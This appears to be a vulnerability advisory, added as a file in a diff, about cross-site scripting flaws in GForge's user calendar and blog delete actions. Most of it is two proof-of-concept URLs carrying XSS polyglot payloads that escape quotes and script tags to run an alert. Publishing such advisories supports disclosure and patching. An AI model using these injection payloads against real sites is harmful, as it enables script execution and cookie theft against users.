@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/51799/info
+
+GForge is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to execute arbitrary script on the affected server and steal cookie-based authentication credentials. Other attacks are also possible. 
+
+http://www.example.com/gf/user/eleo/usercalendar/my/?action=UsercalendarEventDelete&event_id=6&redirect_to=monthview&start_date=1327881600%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
+
+http://www.example.com/gf/user/eleo/userblog/my/admin/?action=UserblogDelete&id=2%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
+
+
